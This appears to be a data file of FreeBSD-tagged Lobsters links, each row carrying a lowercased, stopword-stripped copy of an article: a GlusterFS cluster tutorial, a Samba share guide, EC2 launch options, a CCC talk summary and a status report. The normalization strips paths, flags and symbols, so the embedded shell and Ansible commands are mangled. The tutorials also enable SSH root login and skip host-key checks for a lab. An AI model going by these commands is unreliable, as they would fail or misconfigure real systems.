271,Lobsters,freebsd,FreeBSD,"Machines and systems of past, present, future",http://oshug.org/event/71,machine system past present future,british computer society open source specialist group brief history unixlike operating system acorn hardware stephen borrill precedence technology risc o next richard brown risc o development ltd embedded freebsd fivecore riscv processor using llvm jeremy bennett embecosm buildroot riscv using buildroot create embedded linux system riscv mark corbin embecosm note please aim arrive event start prompt,start year series talk around theme acorn computer risc o riscv toolchain joint meeting british computer society open source specialist group brief history unixlike operating system acorn hardware stephen borrill first encountered unix working phd psychoacoustics longterm acorn user acorn riscpc hardware choice run finishing phd stephen started parttime job acorn computer working technical support led fulltime employment acorn xemplar acorn apple joint venture focussed uk education developed product based bsd unix acorn hardware sold nationally stephen founded precedence technology took support development product worked acorn xemplar continues product year later risc o next risc o open source operating system talk cover heritage risc o direction would like go response since open sourced well demo latest computer run risc o richard brown cofounder director risc o development ltd since inception april richard driving force making risc o truly open source achieved significant funding community support november richard also sole director genesys development ltd company additionally incorporates orpheus internet isp company despite techie background richard would end assisting implementing solution company worked taking opportunity technical knowledge experience richard went work industry set business early richard spent time canada worked camera industry acquired advanced skill photography love instilled richard young person father continues key skill career date embedded freebsd fivecore riscv processor using llvm tasked bringing testing embedded freebsd custom fivecore riscv processor using llvm given freebsd already ported riscv llvm standard bsd cc compiler surely easy nt llvm riscv still relatively immature particularly freebsd run symmetric multicore qemu riscv embedded system heterogeneous multicore system talk go step needed bring functioning embedded freebsd system multicore heterogeneous riscv system target hardware available start project used generally available hifive freedom unleashed board result reference embedded freebsd implementation riscv freely available community talk deep internals freebsd practical engineering step needed bring embedded operating system many key component yet fully mature jeremy bennett chief executive embecosm company developing open source compiler tool chain porting embedded operating system new architecture author standard text book introduction compiling technique mcgrawhill active member riscv compliance task group buildroot riscv using buildroot create embedded linux system riscv buildroot embedded linux build system generates complete system image source wide range board processor recently added support riscv official buildroot distribution make viable alternative build system riscv yocto presentation give brief overview buildroot compare yocto audience unfamiliar system main part talk look issue relating implementation riscv support based experience include look status riscv software ecosystem regard selection suitable toolchain c library kernel bootloader run configure build minimal system booting qemu finally consider work required improve buildroot riscv including status support mark corbin embedded operating system lead embecosm extensive background embedded system development worked linux since specialises building embedded linux distribution currently riscv maintainer buildroot project note please aim arrive event start prompt
272,Lobsters,freebsd,FreeBSD,GlusterFS Cluster on FreeBSD with Ansible and GNU Parallel,https://vermaden.wordpress.com/2019/01/07/glusterfs-cluster-on-freebsd-with-ansible-and-gnu-parallel/,glusterfs cluster freebsd ansible gnu parallel,wikipedia lab setup vmdk command run node command run gluster node command run gluster client command run virtualbox host seq cp vboxglusterfs vmdk done seq vboxmanage internalcommands sethduuid vboxglusterfs vmdk done vboxmanage list vms grep glusterfs vboxmanage list runningvms grep glusterfs vboxmanage list vms grep glusterfs awk f print read vboxmanage startvm type headless done vboxmanage list runningvms cat etcrcconf grep permitrootlogin etcsshsshdconfig sockstat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat ssh l root localhost p ssh cat sshconfig sshcopyid sshidrsa sshcopyid sshidrsa sshcopyid sshidrsa sshcopyid sshidrsa sshcopyid sshidrsa sshcopyid sshidrsa ansible setup cat host ansible host listhosts gluster ansible host raw echo gluster ansible host ping gluster ansible host listhosts gluster sed read ssh env assumealwaysyesyes pkg install python done ansible host listhosts gluster sed read echo ssh echo nameserver etcresolvconf done ansible host listhosts gluster sed read echo ssh echo nameserver etcresolvconf done parallel jot echo n gluster ssh gluster cat etcresolvconf done jot echo echo gluster ssh gluster host freebsdorg done ansible host listhosts gluster sed read echo ssh sed squarterlylatestg etcpkgfreebsdconf done ansible host listhosts gluster sed read echo ssh sed squarterlylatestg etcpkgfreebsdconf done parallel ssh tail etcpkgfreebsdconf ansible host listhosts gluster sed read echo ssh env assumealwaysyesyes pkg install python done ansible host listhosts gluster sed read echo ssh env assumealwaysyesyes pkg install python done parallel ssh pkg info ansible host ping gluster glusterfs volume option setting glusterfs volume distributed replicated distributed replicated dispersed distributed dispersed striped deprecated distributed striped deprecated distributed striped replicated deprecated striped replicated deprecated minio deploy glusterfs cluster cat glustersetupyml ansibleplaybook host glustersetupyml ssh ntpq p ansibledoc pkgng http docsansiblecomansiblelatestmodulespkgngmodulehtml cat glustersetupyml ansibleplaybook host glustersetupyml ssh cat etchosts ssh ping c ssh cat bootloaderconf ssh find data l column ssh service glusterd status gluster peer probe gluster peer probe gluster peer probe gluster peer probe gluster peer probe gluster peer probe gluster volume create dispersedata redundancy transport tcp force gluster volume start gluster volume status gluster volume info find alternative quick start guide glusteransible glusteransiblecluster freebsd client pkg install glusterfs kldload fuse mountglusterfs mnt echo mount l mnt cat etchosts umount mnt mountglusterfs mnt l mnt dd file statusprogress l lh find data linux client yum install glusterfsfuse rpm q filesbypkg glusterfsfuse grep sbinmountglusterfs mountglusterfs mnt cat etchosts mountglusterfs mnt l mnt mount glusterfs cluster redundancy closing thougts like,today would like present article setting glusterfs cluster freebsd system ansible gnu parallel tool cite wikipedia glusterfs scaleout networkattached storage file system found application including cloud computing streaming medium service content delivery network glusterfs page describes similarly gluster scalable distributed file system aggregate disk storage resource multiple server single global namespace advantage scale several petabyte handle thousand client posix compatible us commodity hardware use ondisk filesystem support extended attribute accessible using industry standard protocol like nfs smb provides replicationquotasgeoreplicationsnapshotsbitrot detection allows optimization different workload open source lab setup entirely virtualbox based consist host create freebsd installation used virtual machine image available freebsd project directly several format available using virtualbox used vmdk one use different prompt depending command executed make article readable also prompt regular user needed prompt superuser needed command run node gluster command run gluster node client command run gluster client vbhost command run virtualbox host list machine glusterfs cluster virtualbox virtual machine freebsd default one suggested virtualbox wizard mb ram nat network shown image configuration nat network virtualbox clonedcopied image need different uuids use vboxmanage internalcommands sethduuid command achieve vbhost seq cp vboxglusterfs vmdk done vbhost seq vboxmanage internalcommands sethduuid vboxglusterfs vmdk done start whole glusterfs environment virtualbox use command vbhost vboxmanage list vms grep glusterfs freebsd glusterfs freebsd glusterfs freebsd glusterfs freebsd glusterfs freebsd glusterfs freebsd glusterfs check glusterfs machine running vbhost vboxmanage list runningvms grep glusterfs vbhost starting machine virtualbox headless mode parallel vbhost vboxmanage list vms grep glusterfs awk f print read vboxmanage startvm type headless done command see machine running vbhost vboxmanage list runningvms freebsd glusterfs freebsd glusterfs freebsd glusterfs freebsd glusterfs freebsd glusterfs freebsd glusterfs try connect freebsd machine need make minimal network configuration freebsd machine minimal etcrcconf file shown example host cat etcrcconf ifconfigdefault inet sshdenableyes setup purpose need allow root login freebsd glusterfs machine permitrootlogin yes option etcsshsshdconfig file also need restart sshd service change grep permitrootlogin etcsshsshdconfig permitrootlogin yes service sshd restart using nat network port forwarding freebsd machine accessible localhost port example machine available port machine available port shown sockstat utility output vbhost sockstat user command pid fd proto local address foreign address vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat vermaden vboxnetnat root sshd think corelation ip address port host obvious list machine port localhost connect machine virtualbox host system need command vbhost ssh l root localhost p type every time need login let make come change sshconfig file convenience way possible login short way vbhost ssh modified sshconfig file vbhost cat sshconfig general stricthostkeychecking loglevel quiet keepalive yes serveraliveinterval verifyhostkeydns host setting host stricthostkeychecking compression yes gluster host user root hostname port host user root hostname port host user root hostname port host user root hostname port host user root hostname port host user root hostname port assume already ssh key generated sshidrsa private key let remove need type password ssh login vbhost sshcopyid sshidrsa password root vbhost sshcopyid sshidrsa password root vbhost sshcopyid sshidrsa password root vbhost sshcopyid sshidrsa password root vbhost sshcopyid sshidrsa password root vbhost sshcopyid sshidrsa password root ansible setup already ssh integration configure ansible connect localhost port freebsd machine ansible host file vbhost cat host gluster ansibleuserroot ansibleuserroot ansibleuserroot ansibleuserroot ansibleuserroot ansibleuserroot gluster var listing machine using ansible command vbhost ansible host listhosts gluster host let verify ansible setup work correctly vbhost ansible host raw echo gluster changed changed changed changed changed changed work desired able use ansible module raw default python installed freebsd shown vbhost ansible host ping gluster failed changed false modulestderr modulestdout binsh foundrn msg module failurensee stdoutstderr exact error rc failed changed false modulestderr modulestdout binsh foundrn msg module failurensee stdoutstderr exact error rc failed changed false modulestderr modulestdout binsh foundrn msg module failurensee stdoutstderr exact error rc failed changed false modulestderr modulestdout binsh foundrn msg module failurensee stdoutstderr exact error rc failed changed false modulestderr modulestdout binsh foundrn msg module failurensee stdoutstderr exact error rc failed changed false modulestderr modulestdout binsh foundrn msg module failurensee stdoutstderr exact error rc need get python installed freebsd partially use ansible partially gnu parallel vbhost ansible host listhosts gluster sed read ssh env assumealwaysyesyes pkg install python done pkg error fetching http address record prebuilt version pkg could found system consider changing packagesite installing port portsmgmtpkg bootstrapping pkg pkghttp please wait forgot setting dns freebsd machine let fix easy executing echo nameserver etcresolvconf command freebsd machine let verify input sent gnu parallel executing vbhost ansible host listhosts gluster sed read echo ssh echo nameserver etcresolvconf done ssh echo nameserver etcresolvconf ssh echo nameserver etcresolvconf ssh echo nameserver etcresolvconf ssh echo nameserver etcresolvconf ssh echo nameserver etcresolvconf ssh echo nameserver etcresolvconf look reasonable let engage gnu parallel vbhost ansible host listhosts gluster sed read echo ssh echo nameserver etcresolvconf done parallel computer cpu core max job run local computer job runningjobs completed started jobsaverage second complete verify dns configured properly freebsd machine vbhost jot echo n gluster ssh gluster cat etcresolvconf done nameserver nameserver nameserver nameserver nameserver nameserver verification dns using ping test internet connectivity vbhost jot echo echo gluster ssh gluster host freebsdorg done freebsdorg address freebsdorg address freebsdorg mail handled freebsdorg mail handled freebsdorg address freebsdorg address freebsdorg mail handled freebsdorg mail handled freebsdorg address freebsdorg address freebsdorg mail handled freebsdorg mail handled freebsdorg address freebsdorg address freebsdorg mail handled freebsdorg mail handled freebsdorg address freebsdorg address freebsdorg mail handled freebsdorg mail handled freebsdorg address freebsdorg address freebsdorg mail handled freebsdorg mail handled dns resolution work properly switch default quarterly pkg repository latest one frequent update name suggests need use sed squarterlylatestg etcpkgfreebsdconf command freebsd machine verification sent gnu parallel vbhost ansible host listhosts gluster sed read echo ssh sed squarterlylatestg etcpkgfreebsdconf done ssh sed squarterlylatestg etcpkgfreebsdconf ssh sed squarterlylatestg etcpkgfreebsdconf ssh sed squarterlylatestg etcpkgfreebsdconf ssh sed squarterlylatestg etcpkgfreebsdconf ssh sed squarterlylatestg etcpkgfreebsdconf ssh sed squarterlylatestg etcpkgfreebsdconf let send command freebsd machine vbhost ansible host listhosts gluster sed read echo ssh sed squarterlylatestg etcpkgfreebsdconf done parallel computer cpu core max job run local computer job runningjobs completed started jobsaverage second complete shown latest repository configured etcpkgfreebsdconf file freebsd machine vbhost ssh tail etcpkgfreebsdconf freebsd url pkghttp pkgfreebsdorg abi latest mirrortype srv signaturetype fingerprint fingerprint usrsharekeyspkg enabled yes may get back python vbhost ansible host listhosts gluster sed read echo ssh env assumealwaysyesyes pkg install python done ssh env assumealwaysyesyes pkg install python ssh env assumealwaysyesyes pkg install python ssh env assumealwaysyesyes pkg install python ssh env assumealwaysyesyes pkg install python ssh env assumealwaysyesyes pkg install python ssh env assumealwaysyesyes pkg install python execution freebsd machine gnu parallel vbhost ansible host listhosts gluster sed read echo ssh env assumealwaysyesyes pkg install python done parallel computer cpu core max job run local computer job runningjobs completed started jobsaverage second complete python package dependency installed vbhost ssh pkg info gnu gettext runtime library program utility regenerate gnu info page index foreign function interface package manager metaport default version python interpreter metaport version python interpreter interpreted objectoriented programming language library editing command line typed ansible ping module work desired ansible host ping gluster success changed false ping pong success changed false ping pong success changed false ping pong success changed false ping pong success changed false ping pong success changed false ping pong glusterfs volume option glusterfs lot option setup volume described glusterfs administration guide setting glusterfs volume part distributed distributed volume distribute file across brick volume use distributed volume requirement scale storage redundancy either important provided hardwaresoftware layer replicated replicated volume replicate file across brick volume use replicated volume environment highavailability highreliability critical distributed replicated distributed replicated volume distribute file across replicated brick volume use distributed replicated volume environment requirement scale storage highreliability critical distributed replicated volume also offer improved read performance environment dispersed dispersed volume based erasure code providing spaceefficient protection disk server failure store encoded fragment original file brick way subset fragment needed recover original file number brick missing without losing access data configured administrator volume creation time distributed dispersed distributed dispersed volume distribute file across dispersed subvolumes advantage distribute replicate volume using disperse store data brick striped deprecated striped volume stripe data across brick volume best result use striped volume high concurrency environment accessing large file distributed striped deprecated distributed striped volume stripe data across two node cluster use distributed striped volume requirement scale storage high concurrency environment accessing large file critical distributed striped replicated deprecated distributed striped replicated volume distributes striped data across replicated brick cluster best result use distributed striped replicated volume highly concurrent environment parallel access large file performance critical release configuration volume type supported map reduce workload striped replicated deprecated striped replicated volume stripe data across replicated brick cluster best result use striped replicated volume highly concurrent environment parallel access large file performance critical release configuration volume type supported map reduce workload still supported dispersed volume seems best choice like minio dispersed volume based erasure code server use setup logical server mean able lost without service outage also mean upload mb file volume use mb space across server mb node visualize following ascii diagram deploy glusterfs cluster use glustersetupyml ansible playbook let create something start example always install latest python package vbhost cat glustersetupyml name install setup glusterfs freebsd host gluster user root task name install latest python package pkgng name python state latest execute vbhost ansibleplaybook host glustersetupyml play install setup glusterfs freebsd task gathering fact ok ok ok ok ok ok task install latest python package ok ok ok ok ok ok play recap installed python machine update needed creating cluster need add time synchronization node cluster use mose obvious solution ntpd daemon freebsd base system line added glustersetupyml playbook achieve goal name enable ntpd service raw sysrc ntpdenableyes name start ntpd service service name ntpd state started executing playbook ansibleplaybook host glustersetupyml command see additional output one shown task enable ntpd service changed changed changed changed changed changed task start ntpd service changed changed changed changed changed changed random verification ntp service vbhost ssh ntpq p remote refid st poll reach delay offset jitter pool p ntpifjedupl u newsarchiveic u need install glusterfs freebsd machine glusterfs package add appropriate section playbook name install latest glusterfs package pkgng state latest name glusterfs ncdu add one package pkgng ansible module example also added ncdu package read pkgng ansible module typing ansibledoc pkgng command least short version argument vbhost ansibledoc pkgng name package manager freebsd pkgng annotation commaseparated list keyvaluepairs form denotes adding annotation denotes removing annotation denotes modifying annotation setting modifying annotation value must provided autoremove remove automatically installed package longer needed cached use local package base instead fetching updated one chroot pkg chroot specified environment used together rootdir jail option jail pkg execute given jail name id used together chroot rootdir option name required name list name package installremove pkgsite pkgng version specify packagesite use downloading package specified use setting usrlocaletcpkgconf newer pkgng version specify name repository configured usrlocaletcpkgrepos rootdir pkgng version later pkg install package within specified root directory used together chroot jail option state state package note latest added read particular module following http docsansiblecomansiblelatestmodulespkgngmodulehtml ansible page add glusterfs node etchosts file add parameter bootloaderconf file system boot second faster default delay setting glustersetupyml ansible playbook far vbhost cat glustersetupyml name install setup glusterfs freebsd host gluster user root task name install latest python package pkgng name python state latest name enable ntpd service raw sysrc ntpdenableyes name start ntpd service service name ntpd state started name install latest glusterfs package pkgng state latest name glusterfs ncdu name add node etchosts file blockinfile path etchosts block name add autobootdelay bootloaderconf file lineinfile path bootloaderconf line create yes result execution playbook vbhost ansibleplaybook host glustersetupyml play install setup glusterfs freebsd task gathering fact ok ok ok ok ok ok task install latest python package ok ok ok ok ok ok task install latest glusterfs package ok ok ok ok ok ok task add node etchosts file changed changed changed changed changed changed task enable glusterfs service changed changed changed changed changed changed task add autobootdelay bootloaderconf file changed changed changed changed changed changed play recap let check freebsd machine ping name vbhost ssh cat etchosts loopback localhost localhostmydomain localhost localhostmydomain begin ansible managed block end ansible managed block vbhost ssh ping c ping data byte byte m ping statistic packet transmitted packet received packet loss roundtrip minavgmaxstddev m bootloaderconf file vbhost ssh cat bootloaderconf need create directory glusterfs data without better idea use data directory directory brick put dirs setup use one brick per server production environment would probably use one brick per physical disk playbook command use create directory freebsd machine name create brick directory raw mkdir p hostname grep e executing ansibleplaybook host glustersetupyml command directory beed created vbhost ssh find data l column drwxrxrx root wheel dec data drwxrxrx root wheel dec drwxrxrx root wheel dec need add glusterdenableyes etcrcconf file glusterfs node start glsuterfs service snippet add playbook name enable glusterfs service raw sysrc glusterdenableyes name start glusterfs service service name glusterd state started let make quick random verification vbhost ssh service glusterd status glusterd running pid need proceed last part glusterfs setup create volume node glusterfs cluster first need peer probe node gluster peer probe peer probe success probe localhost needed gluster peer probe peer probe success gluster peer probe peer probe success gluster peer probe peer probe success gluster peer probe peer probe success gluster peer probe peer probe success create volume need use force option example setup use directory root partition gluster volume create dispersedata redundancy transport tcp force volume create success please start volume access data start glsuerfs volume gluster volume start volume start success gluster volume status status volume gluster process tcp port rdma port online pid brick na na n na brick na na n na brick na na n na brick na na n na brick na na n na brick na na n na selfheal daemon localhost na na n selfheal daemon na na n selfheal daemon na na n selfheal daemon na na n selfheal daemon na na n selfheal daemon na na n task status volume active volume task gluster volume info volume name type disperse volume id status started snapshot count number brick x transporttype tcp brick option reconfigured nfsdisable transportaddressfamily inet content currently unusedempty brick find glusterfs cluster complete available use alternative glusterfs documentation quick start guide also suggests using ansible deploy manage glusterfs glusteransible repository glusteransiblecluster requirement ansible version glusterfs version glusterfs freebsd version used freebsd client use another virtualbox machine also based freebsd image create freebsd client machine mount volume need install glusterfs package pkg command use mountglusterfs command mount volume keep mind order mount glusterfs volume fuse fuseko kernel module needed client pkg install glusterfs client kldload fuse client mountglusterfs mnt client echo client mount devgptrootfs ufs local softupdates devfs dev devfs local multilabel devfuse mnt fusefs local synchronous client l mnt l mnt socket connected mounted work solution problem add appropriate etchosts entry glusterfs node client cat etchosts localhost localhostmydomain localhost localhostmydomain let mount needed etchosts entry client umount mnt client mountglusterfs mnt client l mnt client glusterfs volume properly mounted working freebsd client machine let write file dd see work client dd file statusprogress byte mb mib transferred mb record record byte transferred sec bytessec let see look brick directory l lh total drw root wheel jan glusterfs rwr r root wheel jan file find data data linux client also show mount glusterfs volume red hat clone centos latest incarnation require glusterfsfuse package installation root localhost yum install glusterfsfuse root localhost rpm q filesbypkg glusterfsfuse grep sbinmountglusterfs glusterfsfuse sbinmountglusterfs root localhost mountglusterfs mnt mount failed please check log file detail similarly like freebsd client etchosts entry needed root localhost cat etchosts localhost localhostlocaldomain localhost localhostlocaldomain root localhost mountglusterfs mnt root localhost l mnt file root localhost mount mnt type fuseglusterfs rw relatime defaultpermissions allowother apropriate etchosts entry work desired see file file generated fron freebsd client machine glusterfs cluster redundancy messing volume creating deleting various file also tested redundancy theory equivalent protection protect u loss two six server shutdown two virtualbox machine volume still available ready use closing thougts pity freebsd provide modern glusterfs package currently version available eof like like loading related
273,Lobsters,freebsd,FreeBSD,People who run BSD,https://runbsd.info/,people run bsd,berkeley software distribution bsd freebsd openbsd netbsd dragonfly bsd hardenedbsd large small company people run bsd story run bsd logo wild story conference talk openbsd freebsd netbsd dragonflybsd hardenedbsd mischa peter roman zolotarev openbsd amsterdam netzkommune,hello berkeley software distribution friendly family unixlike operating system probably heard like bsd freebsd openbsd netbsd dragonfly bsd hardenedbsd name large small company embed bsd product brave curious people run bsd try story run bsd yay please help peer discover request sticker take picture logo wild share story go conference watch talk friend support favorite bsds openbsd freebsd netbsd dragonflybsd hardenedbsd maintained mischa peter roman zolotarev hosted openbsd amsterdam sponsored netzkommune
274,Lobsters,freebsd,FreeBSD,Taming the Chaos: Can we build systems that actually work?,https://media.ccc.de/v/35c3-9647-taming_the_chaos_can_we_build_systems_that_actually_work,taming chaos build system actually work,peter sewell video starting audio related event rem cheri rem cheri http http wwwclcamacukresearchsecurityctsrdcheri http http download file contain multiple language related tag,peter sewell playlist video starting audio related event rely mainstream computer engineering every day insanely complex poorly understood unreliable ccc reminds u every year chronically insecure talk explain way better taming part chaos precise understanding illustrated disturbing fact clean model current architecture c language rem project principled pragmatic new alternative build hardware software security protection developed cheri project computing massively successful routinely trust computer system personal financial medical commercial governmental information time system pervasively prone security flaw subject malicious attack trust trustworthy two root cause first panindustry computing infrastructure processor programming language operating system based design forgiving time simpler system little incentive designin strong security protection second conventional engineering technique use prose specification manually written test testanddebug development good enough make system work common case exclude error single coding error lead devastating exploit doomed perhaps talk highlight sorry state art draw cuttingedge research university cambridge sri international arm partner show way better first show become possible build use rigorous model key existing interface improve engineering riscv architecture c language rem project describe principled pragmatic path build hardware software security protection future system developed cheri project joint work many people last year http http wwwclcamacukresearchsecurityctsrdcheri http http download file contain multiple language talk translated multiple language file available download contain language separate audiotracks desktop video player allow choose please look audio track desktop video player related tag
275,Lobsters,freebsd,FreeBSD,SMB/CIFS on FreeBSD,https://vermaden.wordpress.com/2018/12/27/smb-cifs-on-freebsd/,smbcifs freebsd,vmdk cat etcrcconf serve smbcifs share freebsd samba pkg search samba pkg install cat pw groupadd n vermaden g n pw groupadd n vermaden g pw groupshow vermaden pw useradd n vermaden c u g n pw useradd n vermaden c u g pw usershow vermaden id vermaden su vermaden passwd vermaden pdbedit pkg pdbedit pdbedit u vermaden pdbedit l sysrc sambaserverenableyes sysrc sambaserverenable cat etcrcconf service sambaserver start sockstat l cat datatesttxt access smbcifs share freebsd net share cd mkdir asd net share testc asd grant vuser full net share mountsmbfs vuser vboxtest mnt mount net share test delete net share update smbcifs freebsd bsd future zfs like,use freebsdillumoslinux unixunixlike system big chance like say least window world sometimes need share file window world samba project come handy today would like share minimalistic simple samba configuration also way access smbcifs share freebsd machine naming side cifs common internet file system particular versiondialect smb server message block protocol usual use freebsd server setup used freebsd virtual machine image available project location several format available using virtualbox used vmdk one main freebsd configuration file server small simple one bellow cat etcrcconf hostname samba inet defaultrouter sshdenable yes course need ssh server smbcifs share samba serve smbcifs share freebsd samba several version samba available freebsd exact reason use older version go ahead latest one pkg search samba manage samba pdc ldap backend create sids based guids nsupdate utility gsstsig support free smbcifs addc server client unix free smbcifs addc server client unix free smbcifs addc server client unix first need add samba package pkg install need create configuration file samba assume would like share two thing example data directory write permission vermaden user also home directory homevermaden read permission people vermaden group called public read disabled entirely passing user password access possible share also added several performance related option configuration file cat global workgroup workgroup netbios name smb server string samba security user max smbd process encrypt password yes socket option tcpnodelay iptoslowdelay iptosthroughput sokeepalive aio read size aio write size strict locking strict sync disable printing load printer disable spool yes show add printer wizard data path data public writable yes browsable write list vermaden vermaden path homevermaden public writable browsable write list vermaden also need vermaden user let create one pw command first vermaden group gid n flag show done instead actual change system let try execute command without n flag actually add group pw groupadd n vermaden g n vermaden pw groupadd n vermaden g pw groupshow vermaden vermaden group time create vermaden user uid like group let first try n flag check made pw useradd n vermaden c u g n vermaden homevermaden binsh pw useradd n vermaden c u g pw usershow vermaden vermaden homevermaden binsh let verify vermaden user id vermaden vermaden vermaden vermaden su vermaden pressing scroll lock use arrow key scroll backward console output press scroll lock turn nt scroll lock key pause break key act alike let create password new vermaden user passwd vermaden changing local password vermaden new password retype new password need add vermaden user pdbedit command samba package pdbedit usrlocalbinpdbedit pkg pdbedit usrlocalbinpdbedit installed package pdbedit u vermaden new password retype new password unix username vermaden nt username account flag u user sid primary group sid full name home directory smbvermaden homedir drive logon script profile path smbvermadenprofile domain smb account desc workstation munged dial logon time logoff time second since epoch kickoff time second since epoch password last set fri dec utc password change fri dec utc password must change never last bad password bad password count logon hour ffffffffffffffffffffffffffffffffffffffffff list user pdbedit command use l argument pdbedit l need add samba freebsd system service automatic startup sysrc sambaserverenableyes sambaserverenable yes sysrc sambaserverenable sambaserverenable yes cat etcrcconf hostname samba inet defaultrouter sshdenable yes sambaserverenable yes start samba service service sambaserver start performing sanity check samba configuration ok starting nmbd starting smbd let check samba daemon listen port sockstat l user command pid fd proto local address foreign address root smbd root smbd root nmbd root nmbd let try access data share window system open explorerexe window machine type smbdata location field type smbvermaden username able access share shown let put text testtxt file let verify work freebsd side cat datatesttxt input window able accessmodify file freebsd machine window world access smbcifs share freebsd let try way around default several share already served window c net share share name resource remark c c default share ipc remote ipc admin c window remote admin user c user command completed successfully c share directory window using graphical interface shown using cli interface within cmdexe interpreter net command test share exported vuser user full access right mean readwrite window world command text may copypaste needed c cd c mkdir asd c net share testc asd grant vuser full test shared successfully c net share share name resource remark c c default share ipc remote ipc admin c window remote admin test c asd user c user command completed successfully c let try mount using mountsmbfs command freebsd system address ip window machine mountsmbfs vuser vboxtest mnt password mount devgptrootfs ufs local softupdates devfs dev devfs local multilabel vuser vboxtest mnt smbfs also work way job done may remove test share also net command shown also command text may copypaste needed c net share test delete test deleted successfully c net share share name resource remark c c default share ipc remote ipc admin c window remote admin user c user command completed successfully c sentence concludes article update smbcifs freebsd article featured bsd future zfs episode thanks mentioning eof like like loading related
276,Lobsters,freebsd,FreeBSD,The many ways to launch FreeBSD in EC2,http://www.daemonology.net/blog/2018-12-26-the-many-ways-to-launch-FreeBSD-in-EC2.html,many way launch freebsd,many way launch freebsd launch freebsd ssh community marketplace amis region instance type launch freebsd provide userdata configinit use ami builder create customized freebsd ami freebsd ami builder build freebsd ami modified freebsd source tree make build disk image build ami completely different o supporting work tarsnap view forum thread blog comment powered,many way launch freebsd talking freebsd user recently became aware created lot tool nt done good job explaining importantly use freebsd user many way launch configure freebsd ranging simplest complicated powerful launch freebsd ssh straightforward way get started freebsd using either api easily accessed via awscli package aws console spin stock freebsd ami choice make whether use community marketplace amis region want launch instance many instance type want use large want root disk root filesystem resized automatically select size larger default gb whether attach additional disk hobbyist easiest answer probably use marketplace amis region geographically closest single gb disk default launch instance ssh user su root password required point setting instance like setting physical server launch freebsd provide userdata want automated process something yield consistent configuration without timeconsuming process sshing set thing enter configinit launch instance option providing userdata freebsd processed configinit tool wrote configuring freebsd system example pas userdata etcrcconf firstbootpkgslist yes freebsd install package first boot enable apache daemon complex configuration provide tarball containing file directive append replace multiple configuration file launch portsnap mirror configinit file add line rcconf newsyslogconf creates lighttpdconf run script start synchronizing portsnap master server etc use ami builder create customized freebsd ami maybe rather command run freebsd first boot prefer set thing ahead time enter freebsd ami builder ami boot memory disk installs freebsd onto root disk let make change create new ami long time user may recall early day everything ubuntu normal way create new ami boot instance make change package follows idea ami builder boot memory disk avoids contaminating image creating key log file make process building new amis even easier ami builder make use iam role run configinit repeatably create customized freebsd amis matter minute single command built freebsd ami builder image region currently supported release freebsd freebsd build freebsd ami modified freebsd source tree option give freebsd release possibly customized installing extra package editing configuration file unless launch ami builder buildworldbuildkernel inside running binary shipped freebsd project change freebsd say bug fixed release need backport fix need custom kernel configuration enter make fact exact mechanism used freebsd release engineering team produce official freebsd amis course aws key needed publish image official freebsd release engineering aws account anyone aws account follow process using key run buildworldbuildkernel modified freebsd set parameter aws key aws region bucket used staging upload cd usrsrcrelease make build disk image finally people want build amis even customized easily via freebsd release code maybe want system boot memory disk keep working even eb volume dy maybe want boot nfs making use amazon elastic file system aka nfsasaservice maybe want build ami completely different o name suggests tool simply uploads disk image bakes ami going route everything else need go route something sufficiently obscure almost certainly need everything anyway hope provided tool help run freebsd matter common unusual need find work useful please consider supporting work area something enjoy working something useful day job tarsnap online backup service support would make easier prioritize issue project view forum thread blog comment powered
277,Lobsters,freebsd,FreeBSD,FreeBSD Quarterly Status Report (Jan–Sep 2018),https://www.freebsd.org/news/status/report-2018-01-2018-09.html,freebsd quarterly status report,introduction administration page jenkinsadmin freebsdorg lwhsu freebsdorg http dtrace test zfs test gcc build core freebsdorg portmgrsecretary freebsdorg freebsdorg deb freebsdfoundationorg http wwwfreebsdfoundationorgdonate http wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram http wwwfreebsdfoundationorgnewsandeventsnewsletter http wwwfreebsdfoundationorgjournal http wwwfreebsdfoundationorgnewsandevents http wwwfreebsdfoundationorg brook freebsdorg kib freebsdorg kib freebsdorg imp freebsdorg kevans freebsdorg tsoome freebsdorg arichardson freebsdorg github trasz freebsdorg mk semihalfcom freebsdorg zeising freebsdorg http gitterimfreebsddesktoplobby http githubcomfreebsddesktop gnn freebsdorg domagojstolfa clcamacuk working demo dtrace kib freebsdorg emaste freebsdorg markj freebsdorg mjg freebsdorg bwidawsk freebsdorg http mjg freebsdorg http devnexen gmailcom mmacy freebsdorg http gmailcom dariusmihaim gmailcom gmailcom mihai freebsdorg kib freebsdorg mjg freebsdorg http http kib freebsdorg manu freebsdorg mw semihalfcom pdk semihalfcom rk semihalfcom manu freebsdorg manu freebsdorg mmacy freebsdorg http pdk semihalfcom wma freebsdorg mst semihalfcom nwhitehorn freebsdorg br freebsdorg http wwwyoutubecomwatch manu freebsdorg manu freebsdorg thj freebsdorg manu freebsdorg uboot freebsdorg adridg freebsdorg tcberner freebsdorg puppet freebsdorg gonzo freebsdorg bugtracker pybugz config file example wikiadmin freebsdorg trasz freebsdorg freebsdorg shawnwebb hardenedbsdorg june openssl callfortesting cft september jailed environment guard page news home status home,introductionwith freebsd gone way perhaps useful take look back thing accomplished term many visible change well thing happen behind scene ensure freebsd continues offer alternative design implementation executionthe thing look forward reading numerous summarize cover everything finalizing release administrative work optimization depessimizations feature added fixed many area improvement might surprise littleplease cup coffee tea hot cocoa beverage choice enjoy culmulative set report covering everything done since october ebdrupentries various official semiofficial team found administration page contact jenkins admin jenkinsadmin freebsdorg contact liwen hsu lwhsu freebsdorg freebsd ci team maintains continuous integration task freebsd ci system regularly check change committed project subversion repository successfully built performs various test analysis build result ci team also maintains archive artifact built ci system testing debugging need starting june project sponsored freebsd foundation hardware staff detail sponsored project please refer http addition also helped checking regression openssl update test continuously branch meeting working group two developer summit work progress fixing failing test case build dtrace test zfs test gcc build adding drm port building test current adding test selected project branch eg adding new hardware embedded testbed implementing automatic test bare metal hardware planning running ztest network stack test contact freebsd core team core freebsdorg much core focus past month three item coordination different group support upcoming release timing openssl release posed challenge new openssl version included api change many component base system port required change staying older openssl feasible option would meant backporting many change version openssl would unmaintained upstream source discussion release engineering team scott long updating freebsd release process topic exploration include frequent point release changing support model revising improving tooling used manage tree release additional topic discovered gathering information make decision datadriven example planning developer user survey question think added survey please discus freebsdarch also exploring way collect automated hardwareusage data help project understand changing way software used improve hardware support noteworthy event chronological order since 